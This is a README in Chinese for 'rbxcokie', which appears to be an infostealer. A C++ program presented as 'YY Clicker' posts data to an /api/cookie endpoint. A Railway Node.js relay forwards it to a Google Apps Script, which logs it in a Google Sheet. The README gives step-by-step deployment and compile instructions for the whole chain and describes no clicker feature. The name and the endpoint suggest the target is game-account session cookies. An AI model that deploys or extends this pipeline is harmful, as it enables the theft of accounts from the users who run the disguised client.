# rbxcokie — Railway 中轉伺服器

## 架構概覽

```
C++ Client (YY Clicker)
    │
    │  HTTPS POST /api/cookie
    │  (WinINet)
    ▼
Railway 中轉伺服器 (Node.js + Express)
    │
    │  HTTPS POST
    │  (node-fetch)
    ▼
Google Apps Script (Web App)
    │
    │  SpreadsheetApp API
    ▼
Google 試算表 (Sheets)
```

## 檔案說明

| 檔案 | 說明 |
|------|------|
| `server.js` | Railway 中轉伺服器主程式 |
| `package.json` | Node.js 依賴設定 |
| `Procfile` | Railway 啟動指令 |
| `railway.json` | Railway 部署設定 |
| `google_apps_script.js` | Google Apps Script 程式碼（需手動部署至 script.google.com） |
| `yy_clicker.cpp` | C++ 客戶端完整原始碼 |

## 部署步驟

### 1. Google Apps Script

1. 前往 [Google Apps Script](https://script.google.com/) 建立新專案
2. 將 `google_apps_script.js` 的內容貼入 `Code.gs`
3. 修改 `SPREADSHEET_ID` 為您的 Google 試算表 ID
4. 部署 → 新增部署作業 → 網頁應用程式
5. 執行身分：「我」，存取權限：「所有人」
6. 複製部署後的 Web App URL

### 2. Railway 中轉伺服器

1. 前往 [Railway](https://railway.app/)
2. 連結此 GitHub 倉庫（自動部署）
3. 設定環境變數：
   - `GOOGLE_SCRIPT_URL` = 上一步取得的 Web App URL

### 3. C++ 客戶端

1. 修改 `yy_clicker.cpp` 中的 `RELAY_SERVER_HOST` 為您的 Railway 公開域名
2. 使用 MSVC 編譯：
   ```
   cl /O2 /DUNICODE /D_UNICODE yy_clicker.cpp /link user32.lib winmm.lib gdi32.lib kernel32.lib advapi32.lib wininet.lib
   ```

## 環境變數

| 變數名稱 | 說明 |
|----------|------|
| `GOOGLE_SCRIPT_URL` | Google Apps Script Web App 的部署 URL |
| `PORT` | 伺服器監聽埠（Railway 自動提供） |
